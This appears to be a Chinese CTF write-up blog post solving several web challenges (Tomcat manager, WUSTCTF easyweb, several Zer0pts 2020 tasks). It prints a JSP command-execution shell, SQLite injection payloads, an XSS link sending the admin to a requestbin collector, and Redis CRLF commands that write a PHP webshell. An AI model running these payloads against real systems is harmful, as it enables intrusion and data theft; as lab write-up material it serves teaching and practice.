<p><strong>方法一</strong></p>
<p>官方wp是直接将传wp时的<code>/examples</code>修改为<code>/manager</code>，这样cookie的Path就对应了</p>
<p><img src="https://i.loli.net/2020/04/03/szHGSQAyn7weLER.png" alt="Snipaste_2020-04-03_20-18-19.png"></p>
<p>加上basic认证，出现403，然后替换新的setCookie值也还是403，遂作罢</p>
<p><strong>方法二</strong></p>
<p>和Mrkaixin师傅讨论了下，修改响应包使<code>Path=/..;/manger</code></p>
<p><img src="https://i.loli.net/2020/04/03/nagAFWdTQuUmC8r.png" alt="Snipaste_2020-04-03_20-35-26.png"></p>
<p>或者可以直接F12修改Cookie</p>
<p><img src="https://i.loli.net/2020/04/03/gkPVxbNFGzUsZrp.png" alt="TIM图片20200403205537.png"></p>
<p>传war包</p>
<p><img src="https://i.loli.net/2020/04/03/SAZHRkq671jEVGy.png" alt="Snipaste_2020-04-03_21-00-06.png"></p>
<p>冰蝎</p>
<p><img src="https://i.loli.net/2020/04/03/qIrw9RXeLTcYmVW.png" alt="Snipaste_2020-04-03_20-46-23.png"></p>
<hr>
<h4><span id="wustctf2020easyweb">[WUSTCTF2020]easyweb</span></h4><p>上传文件之后存在下载操作，任意文件读取漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;download?file&#x3D;3e6916d2-645a-4d6a-8adf-9eff8ad74d89.jpeg</span><br></pre></td></tr></table></figure>

<p>中间还报错得到了路径</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;uploads&#x2F;null (No such file or directory)</span><br></pre></td></tr></table></figure>

<p><code>/uploads</code>目录无法直接访问，但是可以配合幽灵猫漏洞文件包含</p>
<blockquote>
<p><a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487" target="_blank" rel="noopener">https://github.com/00theway/Ghostcat-CNVD-2020-10487</a> </p>
</blockquote>
<p>写个<code>1.jsp</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import&#x3D;&quot;java.util.*,java.io.*&quot;%&gt;</span><br><span class="line">&lt;% </span><br><span class="line">out.println(&quot;Executing command&quot;);</span><br><span class="line">Process p &#x3D; Runtime.getRuntime().exec(&quot;ls &#x2F;&quot;);</span><br><span class="line">OutputStream os &#x3D; p.getOutputStream();</span><br><span class="line">InputStream in &#x3D; p.getInputStream();</span><br><span class="line">DataInputStream dis &#x3D; new DataInputStream(in);</span><br><span class="line">String disr &#x3D; dis.readLine();</span><br><span class="line">while ( disr !&#x3D; null ) &#123;</span><br><span class="line">  out.println(disr); </span><br><span class="line">  disr &#x3D; dis.readLine(); </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>能成功执行命令，但是回显有点奇怪，反弹shell也失败，jsp不能使用``包裹命令直接带出，最后用@Mrkaixin的木马反弹shell成功</p>
<hr>
<h4><span id="zer0pts2020phpnantokaadm">[Zer0pts2020]phpNantokaAdm</span></h4><p>给了源码</p>
<p><code>index.php</code></p>
<p><img src="https://i.loli.net/2020/04/10/AFEOgWTtdUxVMZP.png" alt="Snipaste_2020-04-10_12-22-47.png"></p>
<p>sqlite数据库，存在明显的sql注入，跟进<code>is_vaild()</code></p>
<p><img src="https://i.loli.net/2020/04/10/So5rJf6M4Ad2a1H.png" alt="Snipaste_2020-04-10_12-24-25.png"></p>
<p>构造形式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE $table (dummy1 TEXT,dummy2 TEXT,&#96;$column&#96; $type);</span><br></pre></td></tr></table></figure>

<p>=&gt;</p>
<blockquote>
<p>本地测试可以利用<a href="https://www.phpliteadmin.org/download/" target="_blank" rel="noopener">phpliteadmin</a></p>
</blockquote>
<p>在执行sql语句前出现了其他查询</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$pdo-&gt;query(&#39;CREATE TABLE &#96;&#39; . FLAG_TABLE . &#39;&#96; (&#96;&#39; . FLAG_COLUMN . &#39;&#96; TEXT);&#39;);</span><br><span class="line">$pdo-&gt;query(&#39;INSERT INTO &#96;&#39; . FLAG_TABLE . &#39;&#96; VALUES (&quot;&#39; . FLAG . &#39;&quot;);&#39;);</span><br><span class="line">$pdo-&gt;query($sql);</span><br></pre></td></tr></table></figure>

<p>1、在<strong>创建表</strong>时可以用<code>as</code>来复制另一个表中的数据。这里我们就可以用<code>as select sql from sqlite_master</code>来复制<code>sqlite_master</code>的<code>sql</code>字段。 </p>
<p>2、 双引号被过滤了，在sqlite中可以用中括号<code>[]</code>来代替。 </p>
<p>3、使用<code>as</code>+表别名是指在一个特定的 SQLite 语句中重命名表。重命名是临时的改变，在数据库中实际的表的名称不会改变。 列别名用来为某个特定的 SQLite 语句重命名表中的列。 和其他数据库类似，别名的关键字<code>as</code>可以被省略 </p>
<p>构造如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE a as select sql as[ (dummy1 TEXT, dummy2 TEXT, &#96;]from sqlite_master;&#96; 2);</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/04/10/DGPsC8Sv9oZlVBK.png" alt="Snipaste_2020-04-10_14-08-20.png"></p>
<p>=&gt;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table_name&#x3D;a as select sql as[&amp;columns[0][name]&#x3D;]from sqlite_master;&amp;columns[0][type]&#x3D;2</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/04/10/Mdtm1iqlVuwpS3e.png" alt="Snipaste_2020-04-10_13-38-46.png"></p>
<p>第二次查询</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table_name&#x3D;a as select flag_2a2d04c3 as[&amp;columns[0][name]&#x3D;]from flag_bf1811da;&amp;columns[0][type]&#x3D;2</span><br></pre></td></tr></table></figure>

<hr>
<h4><span id="zer0pts2020musicblog">[Zer0pts2020]musicblog</span></h4><p>查看源码，发现flag在<code>worker.js</code>中设置在浏览器UA中</p>
<p><img src="https://i.loli.net/2020/04/10/TrBQgd87snlKWc9.png" alt="Snipaste_2020-04-10_14-48-18.png"></p>
<p>admin会自动点击<code>#like</code>标签</p>
<p>观察插入content的地方</p>
<p><img src="https://i.loli.net/2020/04/10/Z6d2enr93xELhYD.png" alt="Snipaste_2020-04-10_14-29-52.png"></p>
<p>而这个<code>strip_tags()</code>存在bug</p>
<p><code>strip_tags site:bugs.php.net</code></p>
<blockquote>
<p><a href="https://bugs.php.net/bug.php?id=78814" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=78814</a> </p>
</blockquote>
<p><code>&lt;audio&gt;</code>标签受CSP限制，这里可以利用bug构造一个<code>&lt;a&gt;</code>标签绕过CSP的限制</p>
<p>构造<code>&lt;a/udio id=like href=//http.requestbin.buuoj.cn/x6l5fvx6&gt;aa</code></p>
<p>自己测试下成功跳转，然后等待admin点击即可</p>
<hr>
<h4><span id="zer0pts2020can-you-guess-it">[Zer0pts2020]Can you guess it?</span></h4><p>源码</p>
<p><img src="https://i.loli.net/2020/04/10/Lcq9Dki4Txrb6uX.png" alt="Snipaste_2020-04-10_15-07-39.png"></p>
<p> <code>$_SERVER[&#39;PHP_SELF&#39;]</code>表示当前执行脚本的文件名，</p>
<p>构造<code>/index.php/config.php?source</code></p>
<p>但是这里正则匹配<code>/config\.php\/*$/i</code></p>
<p>匹配形式如<code>config.php///</code>的字符串</p>
<p>搜索<code>basename()</code>的bug</p>
<p><code>basename site:bugs.php.net</code></p>
<blockquote>
<p><a href="https://bugs.php.net/bug.php?id=62119" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=62119</a> </p>
</blockquote>
<p><code>basename()</code>会丢弃文件名中非ASCII字符。</p>
<p>加在结尾，可以成功绕过正则<code>/index.php/config.php/%ff?source</code></p>
<hr>
<h4><span id="zer0pts2020urlapp">[Zer0pts2020]urlapp</span></h4><blockquote>
<p><a href="https://www.anquanke.com/post/id/200927" target="_blank" rel="noopener">https://www.anquanke.com/post/id/200927</a> </p>
</blockquote>
<p>url缩短，用redis存储</p>
<p>查看redis配置文件</p>
<p><img src="https://i.loli.net/2020/04/10/luZHzXQ2r4govGq.png" alt="Snipaste_2020-04-10_16-16-28.png"></p>
<p>禁用了一些指令</p>
<p>处理过程</p>
<p><img src="C:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-04-10_16-19-25.png" alt="Snipaste_2020-04-10_16-19-25"></p>
<p>如果是POST请求，对传入的url进行正则检测，调用<code>set()</code>函数</p>
<p><img src="https://i.loli.net/2020/04/10/R2foi9Uwq4LsKeN.png" alt="Snipaste_2020-04-10_16-31-32.png"></p>
<p>相当于发送redis命令，这里存在CRLF注入，直接操作redis。</p>
<p>比如常见的些shell或者定时任务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">config set dir &#x2F;var&#x2F;www</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set webshell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>但是常用的redis执行被禁用，比如<code>CONFIG</code></p>
<p>参考wp，这里找到了<code>BITOP</code>命令，可以对key做位运算，并把结果保存到新key里。 </p>
<blockquote>
<p><a href="https://redis.io/commands/bitop" target="_blank" rel="noopener">https://redis.io/commands/bitop</a> </p>
</blockquote>
<p>构造16位符合条件的文件名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SET tmp 1</span><br><span class="line">BITOP XOR abababababababab flag tmp</span><br></pre></td></tr></table></figure>

<p>即写入<code>abababababababab</code>中</p>
<p><img src="https://i.loli.net/2020/04/10/cnbIqUS27PLYlNg.png" alt="Snipaste_2020-04-10_16-20-13.png"></p>
<p><img src="https://i.loli.net/2020/04/10/SD1zpF7GAEX8wM3.png" alt="Snipaste_2020-04-10_17-06-57.png"></p>
<p>一开始q访问出现404</p>
<p>这里的思路是利用<code>setbit</code>把某一位变成<code>?</code> 或者<code>/</code></p>
<p><code>1</code>和<code>f</code>异或得到<code>W</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">W&#x3D;&gt;01010111</span><br><span class="line">?&#x3D;&gt;00111111</span><br></pre></td></tr></table></figure>

<p>使用<code>setbit</code>讲<code>W</code>转化为<code>?</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SET tmp 1</span><br><span class="line">BITOP XOR abababababababab flag tmp</span><br><span class="line">setbit abababababababab 1 0</span><br><span class="line">setbit abababababababab 2 1</span><br><span class="line">setbit abababababababab 4 1</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/04/10/6BsSuMCaQxVKmEh.png" alt="Snipaste_2020-04-10_17-16-25.png"></p>
<hr>
<h4><span id="zer0pts2020notepad">[Zer0pts2020]notepad</span></h4><p>flask框架</p>

            </div>
          

    
      <footer class="post-footer">

        
         <div>    
          
          <ul class="post-copyright">
             <li class="post-copyright-link">
              <strong>本文作者：</strong>
              <a href="/" title="欢迎访问 glotozz 的个人博客">glotozz</a>
            </li>

            <li class="post-copyright-license">
              <strong>版权声明： </strong>
               本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！
            </li>
          </ul>
        
      </div>
      
        <div class="post-tags">
          
            <a href="/tags/wp/" rel="tag"><i class="fa fa-tag"></i> wp</a>
          
        </div>
      

        
        
  <nav class="post-nav">
    
      <a class="prev" href="/2020/04/03/eyoucms%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">eyoucms历史漏洞分析</span>
        <span class="prev-text nav-mobile">Prev</span>
      </a>
    
    
      <a class="next" href="/2020/04/02/%E5%8D%8E%E7%A7%91cms-v1-1%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/">
        <span class="next-text nav-default">华科cms_v1.1后台sql注入+前台文件包含getshell</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    
  </nav>

        
  <div class="comments" id="comments">
    
      <div id="vcomments"></div>
    
  </div>


      </footer>
    
  </article>

    </div>

      </div>

      <footer id="colophon">
<span class="copyright-year">
    
        &copy;
    
    2020
    <span class="footer-author">glotozz.</span>
    <span class="power-by">
        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
    </span>
</span>

      </footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div>
    



  
<!-- valine Comments -->
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
<script type="text/javascript">
    new Valine({
        el: '#vcomments',
        notify: false,
        verify: false,
        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
        placeholder: "Just go go",
        avatar: 'mm'
    });
</script>


    




  
    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
  

  

    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>

    <!-- 代码块复制功能 -->
  <script type="text/javascript" src="/js/src/clipboard.min.js"></script>  
  <script type="text/javascript" src="/js/src/clipboard-use.js"></script>
  </body>
</html>
